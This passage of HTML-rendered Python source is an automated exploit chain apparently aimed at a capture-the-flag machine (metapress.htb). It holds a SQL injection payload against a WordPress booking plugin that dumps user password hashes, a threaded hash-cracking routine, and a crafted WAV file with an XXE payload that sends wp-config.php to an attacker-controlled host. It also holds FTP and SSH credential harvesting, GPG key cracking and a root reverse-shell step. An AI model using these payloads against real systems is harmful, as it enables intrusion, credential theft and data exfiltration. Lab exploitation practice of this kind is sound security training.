			<span class="n">progress</span><span class="p">.</span><span class="n">status</span><span class="p">(</span><span class="s">'SSH loggin to extract GPG keys of Password Manager (passpie)'</span><span class="p">);</span> <span class="n">time</span><span class="p">.</span><span class="n">sleep</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span>
			<span class="bp">self</span><span class="p">.</span><span class="n">download_keys_file</span><span class="p">(</span>
				<span class="n">ssh_client</span><span class="o">=</span><span class="bp">self</span><span class="p">.</span><span class="n">ssh_connection</span><span class="p">(</span>
					<span class="bp">self</span><span class="p">.</span><span class="n">credentials</span><span class="p">[</span><span class="s">'ssh_user'</span><span class="p">],</span> 
					<span class="bp">self</span><span class="p">.</span><span class="n">credentials</span><span class="p">[</span><span class="s">'ssh_pass'</span><span class="p">]</span>
				<span class="p">)</span>
			<span class="p">)</span>
			<span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">'extracted gpg keys file : {}'</span><span class="p">.</span><span class="nb">format</span><span class="p">(</span><span class="bp">self</span><span class="p">.</span><span class="n">passpie_keys_file</span><span class="p">))</span>

			<span class="n">progress</span><span class="p">.</span><span class="n">status</span><span class="p">(</span><span class="s">'Extracting private key of gpg key file'</span><span class="p">);</span> <span class="n">time</span><span class="p">.</span><span class="n">sleep</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span>
			<span class="bp">self</span><span class="p">.</span><span class="n">extract_pgp_private_key</span><span class="p">()</span>
			<span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">'gpg private key file : {}'</span><span class="p">.</span><span class="nb">format</span><span class="p">(</span><span class="bp">self</span><span class="p">.</span><span class="n">passpie_private_key</span><span class="p">))</span>
			
			<span class="n">progress</span><span class="p">.</span><span class="n">status</span><span class="p">(</span><span class="s">'Cracking gpg private key with John the Ripper'</span><span class="p">);</span> <span class="n">time</span><span class="p">.</span><span class="n">sleep</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span>
			<span class="bp">self</span><span class="p">.</span><span class="n">crack_gpg_key</span><span class="p">()</span>
			<span class="n">log</span><span class="p">.</span><span class="n">success</span><span class="p">(</span><span class="s">'cracked passpie password -&gt; {}'</span><span class="p">.</span><span class="nb">format</span><span class="p">(</span><span class="bp">self</span><span class="p">.</span><span class="n">credentials</span><span class="p">[</span><span class="s">'passpie_pass'</span><span class="p">]))</span>

			<span class="n">progress</span><span class="p">.</span><span class="n">status</span><span class="p">(</span><span class="s">'SSH login to extract root password'</span><span class="p">);</span> <span class="n">time</span><span class="p">.</span><span class="n">sleep</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span>
			<span class="bp">self</span><span class="p">.</span><span class="n">extract_root_pass</span><span class="p">(</span>
				<span class="n">ssh_client</span><span class="o">=</span><span class="bp">self</span><span class="p">.</span><span class="n">ssh_connection</span><span class="p">(</span>
					<span class="bp">self</span><span class="p">.</span><span class="n">credentials</span><span class="p">[</span><span class="s">'ssh_user'</span><span class="p">],</span>
					<span class="bp">self</span><span class="p">.</span><span class="n">credentials</span><span class="p">[</span><span class="s">'ssh_pass'</span><span class="p">]</span>
				<span class="p">)</span>
			<span class="p">)</span>
			<span class="n">log</span><span class="p">.</span><span class="n">success</span><span class="p">(</span><span class="s">'extracted root password -&gt; {}'</span><span class="p">.</span><span class="nb">format</span><span class="p">(</span><span class="bp">self</span><span class="p">.</span><span class="n">credentials</span><span class="p">[</span><span class="s">'root_pass'</span><span class="p">]))</span>

			<span class="n">progress</span><span class="p">.</span><span class="n">status</span><span class="p">(</span><span class="s">'Running reverse shell as root user to get a shell'</span><span class="p">);</span> <span class="n">time</span><span class="p">.</span><span class="n">sleep</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span>
			<span class="bp">self</span><span class="p">.</span><span class="n">get_shell</span><span class="p">()</span>

	<span class="k">def</span> <span class="nf">extract_wp_nonce</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">response</span><span class="p">,</span> <span class="n">nonce_type</span><span class="p">):</span>
		<span class="k">try</span><span class="p">:</span>
			<span class="k">if</span> <span class="n">nonce_type</span> <span class="o">==</span> <span class="mi">1</span><span class="p">:</span>			
				<span class="k">return</span> <span class="n">re</span><span class="p">.</span><span class="n">findall</span><span class="p">(</span><span class="s">"_wpnonce:'(.*?)'"</span><span class="p">,</span> <span class="n">response</span><span class="p">.</span><span class="n">text</span><span class="p">)[</span><span class="mi">0</span><span class="p">]</span>
			<span class="k">elif</span> <span class="n">nonce_type</span> <span class="o">==</span> <span class="mi">2</span><span class="p">:</span>
				<span class="k">return</span> <span class="n">re</span><span class="p">.</span><span class="n">findall</span><span class="p">(</span><span class="s">'"_wpnonce":"(.*?)"'</span><span class="p">,</span> <span class="n">response</span><span class="p">.</span><span class="n">text</span><span class="p">)[</span><span class="mi">0</span><span class="p">]</span>
			
		<span class="k">except</span> <span class="nb">Exception</span> <span class="k">as</span> <span class="n">error</span><span class="p">:</span>
			<span class="n">sys</span><span class="p">.</span><span class="nb">exit</span><span class="p">(</span><span class="s">"</span><span class="se">\n</span><span class="s">[X] Error: %s"</span> <span class="o">%</span> <span class="n">error</span><span class="p">)</span>

	<span class="k">def</span> <span class="nf">sql_injection</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
		<span class="k">try</span><span class="p">:</span>
			<span class="n">response</span> <span class="o">=</span> <span class="n">requests</span><span class="p">.</span><span class="n">get</span><span class="p">(</span><span class="bp">self</span><span class="p">.</span><span class="n">target_host</span><span class="p">[</span><span class="s">'url_domain'</span><span class="p">]</span> <span class="o">+</span> <span class="s">'/events/'</span><span class="p">)</span>

			<span class="n">wp_nonce</span> <span class="o">=</span> <span class="bp">self</span><span class="p">.</span><span class="n">extract_wp_nonce</span><span class="p">(</span><span class="n">response</span><span class="p">,</span> <span class="mi">1</span><span class="p">)</span>

			<span class="n">post_data</span> <span class="o">=</span> <span class="p">{</span>
				<span class="s">'action'</span> <span class="p">:</span> <span class="s">'bookingpress_front_get_category_services'</span><span class="p">,</span>
				<span class="s">'_wpnonce'</span> <span class="p">:</span> <span class="n">wp_nonce</span><span class="p">,</span>
				<span class="s">'category_id'</span> <span class="p">:</span> <span class="s">'1'</span><span class="p">,</span>
				<span class="s">'total_service'</span> <span class="p">:</span> <span class="s">'-1) union select 1,2,3,4,5,6,7,8,group_concat(0x7c, user_pass, 0x7c) from wp_users#'</span>
			<span class="p">}</span>

			<span class="n">response</span> <span class="o">=</span> <span class="n">requests</span><span class="p">.</span><span class="n">post</span><span class="p">(</span><span class="bp">self</span><span class="p">.</span><span class="n">target_host</span><span class="p">[</span><span class="s">'url_domain'</span><span class="p">]</span> <span class="o">+</span> <span class="s">'/wp-admin/admin-ajax.php'</span><span class="p">,</span> 
				<span class="n">data</span><span class="o">=</span><span class="n">post_data</span><span class="p">)</span>

			<span class="n">manager_password_hash</span> <span class="o">=</span> <span class="n">re</span><span class="p">.</span><span class="n">findall</span><span class="p">(</span><span class="s">"\|(.*?)\|"</span><span class="p">,</span> <span class="n">response</span><span class="p">.</span><span class="n">text</span><span class="p">)[</span><span class="mi">1</span><span class="p">]</span>

			<span class="k">return</span> <span class="n">manager_password_hash</span>

		<span class="k">except</span> <span class="nb">Exception</span> <span class="k">as</span> <span class="n">error</span><span class="p">:</span>
			<span class="n">sys</span><span class="p">.</span><span class="nb">exit</span><span class="p">(</span><span class="s">'</span><span class="se">\n</span><span class="s">[X] Error: %s'</span> <span class="o">%</span> <span class="n">error</span><span class="p">)</span>
	
	<span class="k">def</span> <span class="nf">get_wordlist</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
		<span class="k">with</span> <span class="n">gzip</span><span class="p">.</span><span class="nb">open</span><span class="p">(</span><span class="bp">self</span><span class="p">.</span><span class="n">compressed_wordlist</span><span class="p">,</span> <span class="n">mode</span><span class="o">=</span><span class="s">'rt'</span><span class="p">,</span> <span class="n">errors</span><span class="o">=</span><span class="s">'replace'</span><span class="p">)</span> <span class="k">as</span> <span class="nb">file</span><span class="p">:</span> <span class="c1"># errors='replace' (UnicodeDecodeError)
</span>			<span class="n">wordlist</span> <span class="o">=</span> <span class="nb">file</span><span class="p">.</span><span class="n">readlines</span><span class="p">()</span>
		
		<span class="k">return</span> <span class="n">wordlist</span>

	<span class="k">def</span> <span class="nf">divide_wordlist</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">wordlist</span><span class="p">,</span> <span class="n">wordlist_len</span><span class="p">):</span>
		<span class="s">"""
		yield:

		keyword to return a value like any function 
		but in its next execution it will start from its last call 
		"""</span>
		<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="nb">len</span><span class="p">(</span><span class="n">wordlist</span><span class="p">),</span> <span class="n">wordlist_len</span><span class="p">):</span>
			<span class="k">yield</span> <span class="n">wordlist</span><span class="p">[</span><span class="n">i</span><span class="p">:</span><span class="n">i</span> <span class="o">+</span> <span class="n">wordlist_len</span><span class="p">]</span>

	<span class="k">def</span> <span class="nf">bruteforce_attack</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">password_hash</span><span class="p">,</span> <span class="n">complete_wordlist</span><span class="p">,</span> <span class="n">progress_log</span><span class="p">):</span>
		<span class="s">"""
		Thread implementation

		Split wordlist into subwordlists based on number of threads
		"""</span>
		<span class="n">num_threads</span> <span class="o">=</span> <span class="mi">50</span> <span class="c1"># testing 50 (1:58)
</span>		
		<span class="n">wordlist_list</span> <span class="o">=</span> <span class="nb">list</span><span class="p">(</span><span class="bp">self</span><span class="p">.</span><span class="n">divide_wordlist</span><span class="p">(</span><span class="n">complete_wordlist</span><span class="p">,</span> <span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">complete_wordlist</span><span class="p">)</span> <span class="o">//</span> <span class="n">num_threads</span><span class="p">)))</span>

		<span class="n">password_hash</span> <span class="o">=</span> <span class="n">password_hash</span><span class="p">.</span><span class="n">replace</span><span class="p">(</span><span class="s">"\/"</span><span class="p">,</span> <span class="s">"/"</span><span class="p">)</span> <span class="c1"># remove escape character
</span>		<span class="n">rounds</span><span class="p">,</span> <span class="n">salt</span> <span class="o">=</span> <span class="bp">self</span><span class="p">.</span><span class="n">extract_hash_parts</span><span class="p">(</span><span class="n">password_hash</span><span class="p">)</span>

		<span class="n">threads_list</span> <span class="o">=</span> <span class="p">[]</span>
		<span class="c1"># add each sublist to thread list
</span>		<span class="k">for</span> <span class="n">sub_wordlist</span> <span class="ow">in</span> <span class="n">wordlist_list</span><span class="p">:</span>
			<span class="n">threads_list</span><span class="p">.</span><span class="n">append</span><span class="p">(</span>
				<span class="n">Thread</span><span class="p">(</span>
					<span class="n">target</span><span class="o">=</span><span class="bp">self</span><span class="p">.</span><span class="n">decrypt_password_hash</span><span class="p">,</span> 
					<span class="n">args</span><span class="o">=</span><span class="p">(</span><span class="n">password_hash</span><span class="p">,</span> <span class="n">rounds</span><span class="p">,</span> <span class="n">salt</span><span class="p">,</span> <span class="n">sub_wordlist</span><span class="p">,</span> <span class="n">progress_log</span><span class="p">)</span>
				<span class="p">))</span>

		<span class="c1"># start list threads
</span>		<span class="k">for</span> <span class="n">thread</span> <span class="ow">in</span> <span class="n">threads_list</span><span class="p">:</span>
			<span class="n">thread</span><span class="p">.</span><span class="n">start</span><span class="p">()</span>
		<span class="c1"># waits for threads to terminate
</span>		<span class="k">for</span> <span class="n">thread</span> <span class="ow">in</span> <span class="n">threads_list</span><span class="p">:</span>
			<span class="n">thread</span><span class="p">.</span><span class="n">join</span><span class="p">()</span>

	<span class="k">def</span> <span class="nf">extract_hash_parts</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">password_hash</span><span class="p">):</span>
		<span class="s">"""
		  $P$       B      4aNM28N0  E.tMy/JIcnVMZbGcU16Q70
		{prefix} {rounds}   {salt}         {checksum}
		           1 ch      8 ch             22 ch
		"""</span>
		<span class="n">rounds</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">password_hash</span><span class="p">[</span><span class="mi">3</span><span class="p">],</span> <span class="n">base</span><span class="o">=</span><span class="mi">16</span><span class="p">)</span> <span class="o">+</span> <span class="mi">2</span> <span class="c1"># encoding a 6-bit integer
</span>		<span class="n">salt</span> <span class="o">=</span> <span class="n">password_hash</span><span class="p">[</span><span class="mi">4</span><span class="p">:</span><span class="mi">12</span><span class="p">]</span>
		
		<span class="k">return</span> <span class="n">rounds</span><span class="p">,</span> <span class="n">salt</span>

	<span class="k">def</span> <span class="nf">decrypt_password_hash</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">password_hash</span><span class="p">,</span> <span class="n">rounds</span><span class="p">,</span> <span class="n">salt</span><span class="p">,</span> <span class="n">sub_wordlist</span><span class="p">,</span> <span class="n">progress_log</span><span class="p">):</span>
		<span class="k">try</span><span class="p">:</span>
			<span class="k">for</span> <span class="n">word</span> <span class="ow">in</span> <span class="n">sub_wordlist</span><span class="p">:</span>
				<span class="k">if</span> <span class="bp">self</span><span class="p">.</span><span class="n">stop_threads</span><span class="p">:</span>
					<span class="k">break</span>

				<span class="n">progress_log</span><span class="p">.</span><span class="n">status</span><span class="p">(</span><span class="n">word</span><span class="p">.</span><span class="n">strip</span><span class="p">())</span>
				<span class="n">_hash</span> <span class="o">=</span> <span class="n">phpass</span><span class="p">.</span><span class="nb">hash</span><span class="p">(</span><span class="n">word</span><span class="p">.</span><span class="n">strip</span><span class="p">(),</span> <span class="n">salt</span><span class="o">=</span><span class="n">salt</span><span class="p">,</span> <span class="n">rounds</span><span class="o">=</span><span class="n">rounds</span><span class="p">)</span>

				<span class="k">if</span> <span class="n">_hash</span> <span class="o">==</span> <span class="n">password_hash</span><span class="p">:</span>
					<span class="bp">self</span><span class="p">.</span><span class="n">credentials</span><span class="p">[</span><span class="s">'manager'</span><span class="p">]</span> <span class="o">=</span> <span class="n">word</span><span class="p">.</span><span class="n">strip</span><span class="p">()</span>
					<span class="bp">self</span><span class="p">.</span><span class="n">stop_threads</span> <span class="o">=</span> <span class="bp">True</span>
					<span class="k">break</span>
					
		<span class="k">except</span> <span class="nb">Exception</span> <span class="k">as</span> <span class="n">error</span><span class="p">:</span>
			<span class="n">sys</span><span class="p">.</span><span class="nb">exit</span><span class="p">(</span><span class="s">"</span><span class="se">\n</span><span class="s">[X] Error: %s"</span> <span class="o">%</span> <span class="n">error</span><span class="p">)</span>

	<span class="k">def</span> <span class="nf">create_xxe_files</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">target_file_path</span><span class="p">):</span>
		<span class="s">"""
		(1) .wav file 
		(2) .dtd file
		"""</span>
		<span class="c1"># (1)
</span>		<span class="n">wav_file_content</span> <span class="o">=</span> <span class="s">"RIFFXXXXWAVEiXMLBBBB&lt;?xml version=</span><span class="se">\"</span><span class="s">1.0</span><span class="se">\"</span><span class="s">?&gt;&lt;!DOCTYPE r [</span><span class="se">\n</span><span class="s">&lt;!ELEMENT r ANY &gt;</span><span class="se">\n</span><span class="s">&lt;!ENTITY % sp SYSTEM </span><span class="se">\"</span><span class="s">http://{}:{}/{}</span><span class="se">\"</span><span class="s">&gt;</span><span class="se">\n</span><span class="s">%sp;</span><span class="se">\n</span><span class="s">%param1;</span><span class="se">\n</span><span class="s">]&gt;</span><span class="se">\n</span><span class="s">&lt;r&gt;&amp;exfil;&lt;/r&gt;&gt;"</span> \
			<span class="p">.</span><span class="nb">format</span><span class="p">(</span><span class="bp">self</span><span class="p">.</span><span class="n">ip_address</span><span class="p">,</span> <span class="bp">self</span><span class="p">.</span><span class="n">port</span><span class="p">,</span> <span class="bp">self</span><span class="p">.</span><span class="n">dtd_file_name</span><span class="p">)</span>

		<span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="bp">self</span><span class="p">.</span><span class="n">wav_file_name</span><span class="p">,</span> <span class="s">"wb"</span><span class="p">)</span> <span class="k">as</span> <span class="nb">file</span><span class="p">:</span>
			<span class="nb">file</span><span class="p">.</span><span class="n">write</span><span class="p">(</span><span class="n">wav_file_content</span><span class="p">.</span><span class="n">encode</span><span class="p">())</span>

		<span class="c1"># extrac file size
</span>		<span class="n">wav_file_object</span> <span class="o">=</span> <span class="n">os</span><span class="p">.</span><span class="n">stat</span><span class="p">(</span><span class="bp">self</span><span class="p">.</span><span class="n">wav_file_name</span><span class="p">)</span>
		<span class="n">wav_size_bytes</span> <span class="o">=</span> <span class="n">wav_file_object</span><span class="p">.</span><span class="n">st_size</span>

		<span class="c1"># calcule bytes of xml payload (important to work!)
</span>		<span class="n">little_endian_bytes</span> <span class="o">=</span> <span class="nb">chr</span><span class="p">(</span><span class="n">wav_size_bytes</span> <span class="o">-</span> <span class="mi">20</span><span class="p">)</span> <span class="o">+</span> <span class="s">"</span><span class="se">\x00\x00</span><span class="s">"</span> <span class="c1"># 0xc2 added (weird behavior) ?
</span>
		<span class="n">wav_file_content</span> <span class="o">=</span> <span class="n">wav_file_content</span><span class="p">.</span><span class="n">replace</span><span class="p">(</span><span class="s">"BBBB"</span><span class="p">,</span> <span class="n">little_endian_bytes</span><span class="p">)</span>
		
		<span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="bp">self</span><span class="p">.</span><span class="n">wav_file_name</span><span class="p">,</span> <span class="s">"wb"</span><span class="p">)</span> <span class="k">as</span> <span class="nb">file</span><span class="p">:</span>
			<span class="nb">file</span><span class="p">.</span><span class="n">write</span><span class="p">(</span><span class="n">wav_file_content</span><span class="p">.</span><span class="n">encode</span><span class="p">())</span>
		
		<span class="c1"># (2)
</span>		<span class="n">dtd_file_content</span> <span class="o">=</span> <span class="s">"&lt;!ENTITY % data SYSTEM </span><span class="se">\"</span><span class="s">php://filter/read=convert.base64-encode/resource={}</span><span class="se">\"</span><span class="s">&gt;</span><span class="se">\n</span><span class="s">&lt;!ENTITY % param1 </span><span class="se">\"</span><span class="s">&lt;!ENTITY exfil SYSTEM 'http://{}:{}/?=%data;'&gt;</span><span class="se">\"</span><span class="s">&gt;"</span> \
		<span class="p">.</span><span class="nb">format</span><span class="p">(</span><span class="n">target_file_path</span><span class="p">,</span> <span class="bp">self</span><span class="p">.</span><span class="n">ip_address</span><span class="p">,</span> <span class="bp">self</span><span class="p">.</span><span class="n">port</span><span class="p">)</span>
		
		<span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="bp">self</span><span class="p">.</span><span class="n">dtd_file_name</span><span class="p">,</span> <span class="s">"wt"</span><span class="p">)</span> <span class="k">as</span> <span class="nb">file</span><span class="p">:</span>
			<span class="nb">file</span><span class="p">.</span><span class="n">write</span><span class="p">(</span><span class="n">dtd_file_content</span><span class="p">)</span>

	<span class="k">def</span> <span class="nf">share_server</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
		<span class="s">"""
		Create server with python to receive XXE response (wp-config.php)
		and save into a log file
		"""</span>
		<span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="bp">self</span><span class="p">.</span><span class="n">log_file_name</span><span class="p">,</span> <span class="s">'wt'</span><span class="p">)</span> <span class="k">as</span> <span class="n">log_file</span><span class="p">:</span>
			<span class="n">command</span> <span class="o">=</span> <span class="s">"python3 -m http.server {}"</span><span class="p">.</span><span class="nb">format</span><span class="p">(</span><span class="bp">self</span><span class="p">.</span><span class="n">port</span><span class="p">)</span>
			<span class="n">python_server</span> <span class="o">=</span> <span class="n">subprocess</span><span class="p">.</span><span class="n">Popen</span><span class="p">(</span><span class="n">shlex</span><span class="p">.</span><span class="n">split</span><span class="p">(</span><span class="n">command</span><span class="p">),</span> <span class="n">stdout</span><span class="o">=</span><span class="n">log_file</span><span class="p">,</span> <span class="n">stderr</span><span class="o">=</span><span class="n">log_file</span><span class="p">)</span>
			
		<span class="k">return</span> <span class="n">python_server</span>

	<span class="k">def</span> <span class="nf">wordpress_authentication</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
		<span class="s">"""
		(1) Login with manager credentials
		(2) Upload malicious .wav file
		"""</span>
		<span class="k">try</span><span class="p">:</span>
			<span class="k">with</span> <span class="n">requests</span><span class="p">.</span><span class="n">Session</span><span class="p">()</span> <span class="k">as</span> <span class="n">session</span><span class="p">:</span>
				<span class="c1"># (1)
</span>				<span class="n">headers</span> <span class="o">=</span> <span class="p">{</span> <span class="s">'Content-type'</span> <span class="p">:</span> <span class="s">'application/x-www-form-urlencoded'</span> <span class="p">}</span>

				<span class="n">form_data</span> <span class="o">=</span> <span class="p">{</span>
					<span class="s">'log'</span> <span class="p">:</span> <span class="nb">list</span><span class="p">(</span><span class="bp">self</span><span class="p">.</span><span class="n">credentials</span><span class="p">.</span><span class="n">keys</span><span class="p">())[</span><span class="mi">0</span><span class="p">],</span>
					<span class="s">'pwd'</span> <span class="p">:</span> <span class="bp">self</span><span class="p">.</span><span class="n">credentials</span><span class="p">[</span><span class="s">'manager'</span><span class="p">],</span>
					<span class="s">'wp-submit'</span> <span class="p">:</span> <span class="s">'Log+In'</span> 
				<span class="p">}</span>

				<span class="n">session</span><span class="p">.</span><span class="n">post</span><span class="p">(</span><span class="bp">self</span><span class="p">.</span><span class="n">target_host</span><span class="p">[</span><span class="s">'url_domain'</span><span class="p">]</span> <span class="o">+</span> <span class="s">'/wp-login.php'</span><span class="p">,</span> 
					<span class="n">headers</span><span class="o">=</span><span class="n">headers</span><span class="p">,</span> 
					<span class="n">data</span><span class="o">=</span><span class="n">form_data</span><span class="p">)</span>

				<span class="c1"># (2)
</span>				<span class="n">file_data</span> <span class="o">=</span> <span class="p">{</span>
					<span class="s">'async-upload'</span> <span class="p">:</span> <span class="p">(</span>
						<span class="bp">self</span><span class="p">.</span><span class="n">wav_file_name</span><span class="p">,</span>
						<span class="nb">open</span><span class="p">(</span><span class="bp">self</span><span class="p">.</span><span class="n">wav_file_name</span><span class="p">,</span> <span class="s">'rb'</span><span class="p">),</span>
						<span class="s">'audio/wav'</span>
					<span class="p">),</span>
				<span class="p">}</span>

				<span class="n">response</span> <span class="o">=</span> <span class="n">session</span><span class="p">.</span><span class="n">get</span><span class="p">(</span><span class="bp">self</span><span class="p">.</span><span class="n">target_host</span><span class="p">[</span><span class="s">'url_domain'</span><span class="p">]</span> <span class="o">+</span> <span class="s">'/wp-admin/media-new.php'</span><span class="p">)</span>

				<span class="n">wp_nonce</span> <span class="o">=</span> <span class="bp">self</span><span class="p">.</span><span class="n">extract_wp_nonce</span><span class="p">(</span><span class="n">response</span><span class="p">,</span> <span class="mi">2</span><span class="p">)</span>

				<span class="n">form_data</span> <span class="o">=</span> <span class="p">{</span>
					<span class="s">'_wpnonce'</span> <span class="p">:</span> <span class="n">wp_nonce</span>
				<span class="p">}</span>

				<span class="c1"># implement subprocess to receive log requests
</span>				<span class="n">server_process</span> <span class="o">=</span> <span class="bp">self</span><span class="p">.</span><span class="n">share_server</span><span class="p">()</span>

				<span class="c1"># upload file
</span>				<span class="n">session</span><span class="p">.</span><span class="n">post</span><span class="p">(</span><span class="bp">self</span><span class="p">.</span><span class="n">target_host</span><span class="p">[</span><span class="s">'url_domain'</span><span class="p">]</span>  <span class="o">+</span> <span class="s">'/wp-admin/async-upload.php'</span><span class="p">,</span> 
					<span class="n">files</span><span class="o">=</span><span class="n">file_data</span><span class="p">,</span> 
					<span class="n">data</span><span class="o">=</span><span class="n">form_data</span><span class="p">)</span>
				
				<span class="c1"># terminate process
</span>				<span class="n">server_process</span><span class="p">.</span><span class="n">kill</span><span class="p">()</span>

		<span class="k">except</span> <span class="nb">Exception</span> <span class="k">as</span> <span class="n">error</span><span class="p">:</span>
			<span class="n">sys</span><span class="p">.</span><span class="nb">exit</span><span class="p">(</span><span class="s">'</span><span class="se">\n</span><span class="s">[X] Error: %s'</span> <span class="o">%</span> <span class="n">error</span><span class="p">)</span>

	<span class="k">def</span> <span class="nf">extract_ftp_credentials</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
		<span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="bp">self</span><span class="p">.</span><span class="n">log_file_name</span><span class="p">,</span> <span class="s">'rt'</span><span class="p">)</span> <span class="k">as</span> <span class="n">log_file</span><span class="p">:</span>
			<span class="n">log_content</span> <span class="o">=</span> <span class="n">log_file</span><span class="p">.</span><span class="n">readlines</span><span class="p">()</span>

		<span class="c1"># extract base64 content of log file
</span>		<span class="n">base64_content</span> <span class="o">=</span> <span class="n">re</span><span class="p">.</span><span class="n">findall</span><span class="p">(</span><span class="s">"GET /\?=(.*?) HTTP/1.1"</span><span class="p">,</span> <span class="n">log_content</span><span class="p">[</span><span class="mi">1</span><span class="p">])[</span><span class="mi">0</span><span class="p">]</span>

		<span class="c1"># decode base64 content
</span>		<span class="n">base64_bytes</span> <span class="o">=</span> <span class="n">base64_content</span><span class="p">.</span><span class="n">encode</span><span class="p">(</span><span class="s">'ascii'</span><span class="p">)</span>
		<span class="n">content_bytes</span> <span class="o">=</span> <span class="n">base64</span><span class="p">.</span><span class="n">b64decode</span><span class="p">(</span><span class="n">base64_bytes</span><span class="p">)</span>
		<span class="n">plaintext_content</span> <span class="o">=</span> <span class="n">content_bytes</span><span class="p">.</span><span class="n">decode</span><span class="p">(</span><span class="s">'ascii'</span><span class="p">)</span>

		<span class="c1"># get ftp credentials
</span>		<span class="bp">self</span><span class="p">.</span><span class="n">credentials</span><span class="p">[</span><span class="s">'ftp_user'</span><span class="p">]</span> <span class="o">=</span> <span class="n">re</span><span class="p">.</span><span class="n">findall</span><span class="p">(</span><span class="s">"'FTP_USER', '(.*?)'"</span><span class="p">,</span> <span class="n">plaintext_content</span><span class="p">)[</span><span class="mi">0</span><span class="p">]</span>
		<span class="bp">self</span><span class="p">.</span><span class="n">credentials</span><span class="p">[</span><span class="s">'ftp_pass'</span><span class="p">]</span> <span class="o">=</span> <span class="n">re</span><span class="p">.</span><span class="n">findall</span><span class="p">(</span><span class="s">"'FTP_PASS', '(.*?)'"</span><span class="p">,</span> <span class="n">plaintext_content</span><span class="p">)[</span><span class="mi">0</span><span class="p">]</span>
		
	<span class="k">def</span> <span class="nf">ftp_login</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
		<span class="s">"""
		Login to ftp and download send_mailer.php 
		and extract jnelson credentials
		"""</span>
		<span class="k">try</span><span class="p">:</span>
			<span class="n">ftp_session</span> <span class="o">=</span> <span class="n">FTP</span><span class="p">(</span><span class="s">'metapress.htb'</span><span class="p">,</span> 
				<span class="n">user</span><span class="o">=</span><span class="bp">self</span><span class="p">.</span><span class="n">credentials</span><span class="p">[</span><span class="s">'ftp_user'</span><span class="p">],</span> 
				<span class="n">passwd</span><span class="o">=</span><span class="bp">self</span><span class="p">.</span><span class="n">credentials</span><span class="p">[</span><span class="s">'ftp_pass'</span><span class="p">])</span>

			<span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="bp">self</span><span class="p">.</span><span class="n">exposed_ftp_file</span><span class="p">,</span> <span class="s">'wb'</span><span class="p">)</span> <span class="k">as</span> <span class="nb">file</span><span class="p">:</span>
				<span class="n">ftp_session</span><span class="p">.</span><span class="n">retrbinary</span><span class="p">(</span><span class="sa">f</span><span class="s">"RETR /mailer/</span><span class="si">{</span><span class="bp">self</span><span class="p">.</span><span class="n">exposed_ftp_file</span><span class="si">}</span><span class="s">"</span><span class="p">,</span> <span class="nb">file</span><span class="p">.</span><span class="n">write</span><span class="p">)</span>

			<span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="bp">self</span><span class="p">.</span><span class="n">exposed_ftp_file</span><span class="p">,</span> <span class="s">'r'</span><span class="p">)</span> <span class="k">as</span> <span class="n">ftp_file</span><span class="p">:</span>
				<span class="n">ftp_content</span> <span class="o">=</span> <span class="n">ftp_file</span><span class="p">.</span><span class="n">read</span><span class="p">()</span>
				
				<span class="bp">self</span><span class="p">.</span><span class="n">credentials</span><span class="p">[</span><span class="s">'ssh_user'</span><span class="p">]</span> <span class="o">=</span> <span class="n">re</span><span class="p">.</span><span class="n">findall</span><span class="p">(</span><span class="s">"\$mail-&gt;Username = </span><span class="se">\"</span><span class="s">(.*?)</span><span class="se">\"</span><span class="s">"</span><span class="p">,</span> <span class="n">ftp_content</span><span class="p">)[</span><span class="mi">0</span><span class="p">].</span><span class="n">split</span><span class="p">(</span><span class="s">"@"</span><span class="p">)[</span><span class="mi">0</span><span class="p">]</span>
				<span class="bp">self</span><span class="p">.</span><span class="n">credentials</span><span class="p">[</span><span class="s">'ssh_pass'</span><span class="p">]</span> <span class="o">=</span> <span class="n">re</span><span class="p">.</span><span class="n">findall</span><span class="p">(</span><span class="s">"\$mail-&gt;Password = </span><span class="se">\"</span><span class="s">(.*?)</span><span class="se">\"</span><span class="s">"</span><span class="p">,</span> <span class="n">ftp_content</span><span class="p">)[</span><span class="mi">0</span><span class="p">]</span>

		<span class="k">except</span> <span class="nb">Exception</span> <span class="k">as</span> <span class="n">error</span><span class="p">:</span>
			<span class="n">sys</span><span class="p">.</span><span class="nb">exit</span><span class="p">(</span><span class="s">'</span><span class="se">\n</span><span class="s">[X] Error: %s'</span> <span class="o">%</span> <span class="n">error</span><span class="p">)</span>

	<span class="k">def</span> <span class="nf">download_keys_file</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">ssh_client</span><span class="p">):</span>
		<span class="s">"""
		SSH connection like jnelson to extract passpie .keys file
		"""</span>
		<span class="k">with</span> <span class="n">ssh_client</span><span class="p">.</span><span class="n">open_sftp</span><span class="p">()</span> <span class="k">as</span> <span class="n">sftp_client</span><span class="p">:</span>
